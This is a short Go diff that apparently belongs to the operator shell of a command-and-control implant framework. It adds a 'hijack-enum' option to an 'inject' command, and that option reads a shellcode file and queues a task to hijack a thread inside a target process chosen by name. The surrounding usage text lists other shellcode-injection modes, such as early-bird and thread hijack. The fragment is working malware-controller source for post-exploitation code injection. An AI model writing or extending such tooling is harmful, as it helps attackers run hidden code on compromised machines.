@@ -1767,6 +1767,18 @@ func (sh *Shell) cmdInject(args []string) {
 		return
 	}
 
+	// hijack-enum: hijack a thread inside an existing process by name
+	if len(args) == 3 && args[0] == "hijack-enum" {
+		data, err := os.ReadFile(args[2])
+		if err != nil {
+			Error("Failed to read shellcode file: %v", err)
+			return
+		}
+		sh.queueTask(protocol.TaskInject, []string{args[1], "hijack-enum"}, data)
+		Info("Queued thread hijack into %s (%d bytes)", args[1], len(data))
+		return
+	}
+
 	if len(args) < 2 {
 		Error("Usage: inject <pid> <shellcode-file>")
 		Info("Or: inject earlybird <shellcode-file> | inject hijack <shellcode-file>")
